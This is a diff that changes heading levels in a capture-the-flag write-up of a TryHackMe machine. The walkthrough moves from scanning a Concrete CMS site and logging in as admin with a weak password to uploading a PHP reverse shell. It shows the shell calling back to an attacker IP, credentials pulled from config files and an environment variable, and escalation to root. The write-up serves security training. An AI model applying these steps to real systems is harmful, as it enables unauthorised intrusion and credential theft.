@@ -12,7 +12,7 @@ The IP for my machine was `10.10.10.55`, let's first add it to hosts file
 ```zsh
 echo "10.10.10.55 kingdom.thm" | sudo tee -a /etc/hosts
 ```
-# Enumeration
+## Enumeration
 Starting with an `nmap` scan using default scripts (`-sC`), service detection (`-sV`), and scanning all ports (`-p-`). `-oA` means output all formats, this is just so I can refer back to it easily
 ```
 nmap -sC -sV -oA kingdom_scan -p- kingdom.thm
@@ -24,7 +24,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.7 (Ubuntu)
 |_http-title: 0H N0! PWN3D 4G4IN
 ```
-# Investigating and Fuzzing the Site
+## Investigating and Fuzzing the Site
 Upon navigating to `http://kingdom.thm:85`, we are presented with 
 ![Root Site](/assets/img/thm-mkingdom/rootsite.png)
 There was nothing interesting on this site, so let's kick off `gobuster` to try and find some hidden directories / endpoints
@@ -34,7 +34,7 @@ gobuster dir -u http://kingdom.thm:85 -w /usr/share/wordlists/dirb/big.txt
 /app      (Status: 301) [Size: 310] [--> http://kingdom.thm:85/app/]
 ...
 ```
-## `/app` Endpoint
+### `/app` Endpoint
 Navigating to the `/app` endpoint shows a page with a simple "jump" button. When clicked, the URL changes to `/app/castle`, where we are presented with another site. Upon checking the JS function code for the button, this is the only thing of note that happens (other than an alert message).
 ```js
 function buttonClick() {
@@ -42,7 +42,7 @@ function buttonClick() {
 	window.location.href = 'castle';
 }
 ```
-## `/app/castle` Endpoint
+### `/app/castle` Endpoint
 We can see a webapp using the Concrete CMS version 8.5.2.
 ![Castle Site](/assets/img/thm-mkingdom/app_castle.png)
 No notable exploits were found for this version of Concrete CMS.
@@ -51,13 +51,13 @@ I identified some file upload capabilities within the blog section of the site, 
 
 Following some enumeration, I identified a login page at `http://kingdom.thm:85/app/castle/index.php/login/authenticate/concrete`.
 
-### Locating Usernames and Passwords
+#### Locating Usernames and Passwords
 From navigating the blog section of the `/app/castle` site, we are able to identify a user called `admin`, who is the author of the first, and only post on the blog. This gives us a username we can try to authenticate with. No passwords were located
-### Bypassing the Login
+#### Bypassing the Login
 I tried a number of things to bypass the login such as SQL injection, default credentials, brute force, but to no avail. The reason I gave up with brute force was because after about 5 login attempts, the machine IP blocks you and you are forced to restart the TryHackMe machine.
 
 After hours of bashing my head against my desk, I learned that the password for the admin account is `password`. 
-### Obtaining a Shell (`www-data`)
+#### Obtaining a Shell (`www-data`)
 Typically, when you have admin access to a PHP-based CMS, you want to think about uploading a PHP shell to obtain shell access. With this in mind, I looked at the file upload settings, and added `.php` to the list of allowed extensions. 
 ![Allowed Files](/assets/img/thm-mkingdom/allowed_files.png)
 After that, we can navigate to the `files` section of the CMS, and upload a PHP reverse shell. I used the one from `pentestmonkey` [Link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
@@ -76,12 +76,12 @@ connect to [10.11.47.141] from kingdom.thm [10.10.10.55] 49724
 $ whoami
 www-data
 ```
-# Jump to User (`toad`)
+## Jump to User (`toad`)
 First, stabilise the shell
 ```zsh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-## Application Secrets
+### Application Secrets
 In typical www-data shell fashion, let's first look for any application secrets e.g. database credentials, environment variables, etc, which may help us move to the user account.
 
 There are two `database.php` files:
@@ -114,7 +114,7 @@ su toad
 $ whoami
 toad
 ```
-# Lateral Movement (`mario` user)
+## Lateral Movement (`mario` user)
 Following a LOT of enumeration of the system, I inspected the environment variables of the `toad` user account and identified the following entry:
 ```
 PWD_token=aW....g==
@@ -123,7 +123,7 @@ This is clearly base64 encoded (`==` at the end), and when decoded we get a pass
 
 From here, we can get the user flag at `/home/mario/user.txt`
 For some reason, I had issues running `cat` on the text file. I moved it to `/tmp` directory and I could read it fine.
-# Privilege Escalation
+## Privilege Escalation
 There is an unusual `up.log` in the `/var/log` directory which has the following contents:
 ```
 mario@mkingdom:/var/log$ cat up.log
@@ -176,7 +176,7 @@ sh: 0: can't access tty; job control turned off
 # whoami
 root
 ```
-# Final Thoughts
+## Final Thoughts
 I didn't like this machine for a few reasons:
 - I thought the initial access was silly for a CTF - why make the initial access brute force and then IP ban users after 5 attempts?
 - Password in an environment variable? I found this boring
